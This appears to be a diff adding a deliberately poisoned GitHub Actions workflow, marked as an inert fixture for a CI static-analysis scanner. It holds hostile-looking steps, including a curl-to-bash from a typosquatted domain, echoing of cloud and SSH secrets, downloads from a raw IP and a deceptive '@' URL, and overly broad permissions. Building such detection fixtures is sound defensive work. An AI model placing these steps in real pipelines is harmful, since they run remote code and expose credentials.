@@ -1,0 +1,27 @@
+# INERT TEST FIXTURE: static analysis input only. Never run this workflow.
+name: Poisoned CI fixture - all workflow detections
+
+on: [push]
+
+permissions:
+  contents: write
+  actions: write
+  packages: write
+  deployments: write
+  id-token: write
+  pull-requests: write
+
+jobs:
+  test-only:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Test-only remote execution signature
+        run: curl https://githhub.com/test-fixture/install.sh | bash
+      - name: Test-only sensitive environment references
+        run: echo "$GITHUB_TOKEN $AWS_ACCESS_KEY $AWS_SECRET_ACCESS_KEY $DATABASE_URL $SSH_PRIVATE_KEY"
+      - name: Test-only insecure IP URL
+        run: curl http://192.0.2.10/test-fixture.sh -o /tmp/test-fixture.sh
+      - name: Test-only unknown domain and URL character
+        run: curl https://github.com@fixture.invalid/test -o /tmp/test-fixture.sh
+      - name: Test-only unusually long and deeply nested URL
+        run: curl https://a.b.c.d.this-is-an-intentionally-very-long-fixture-domain-for-static-analysis.invalid/test -o /tmp/test-fixture.sh
